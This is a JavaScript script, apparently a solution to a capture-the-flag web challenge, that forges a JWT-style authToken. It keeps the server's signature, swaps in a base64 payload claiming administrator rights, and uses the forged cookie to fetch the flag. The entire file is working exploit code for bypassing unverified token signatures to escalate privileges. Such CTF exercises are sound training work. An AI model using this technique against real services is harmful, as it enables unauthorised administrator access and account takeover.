import axios from 'axios'
import setCookie from 'set-cookie-parser'

const cookieName = 'authToken'
const url = 'https://mythique1.secu-web.blackfoot.dev'
const targetCookie = '{"exp":1669289642,"data":{"name":"Hack3r","isAdmin":true},"iat":1669286042}'

async function getBaseCookie() {
	const res = await axios({
		method: 'get',
		url: `${url}`,
	})

	const cookies = setCookie.parse(res.headers['set-cookie'])
	const authCookie = cookies.find(({name}) => name == cookieName)

	return authCookie.value
}

function genAdminToken() {
	return btoa(targetCookie)
}

function makeAdminCookie(baseCookie, adminToken) {
	const splitCookie = baseCookie.split('.')

	splitCookie[1] = adminToken
	return splitCookie.join('.')
}

async function getFlag(adminCookie) {
	const res = await axios({
		method: 'get',
		url: `${url}/flag`,
		headers: {
			Cookie: `${cookieName}=${adminCookie}`,
		}
	})

	return res.data.flag
}

async function main() {
	const baseCookie = await getBaseCookie()

	const adminCookie = makeAdminCookie(baseCookie, genAdminToken())
	console.log(`admin cookie: ${adminCookie}\n`)

	const flag = await getFlag(adminCookie)
	console.log(`flag: ${flag}`)
}

main()
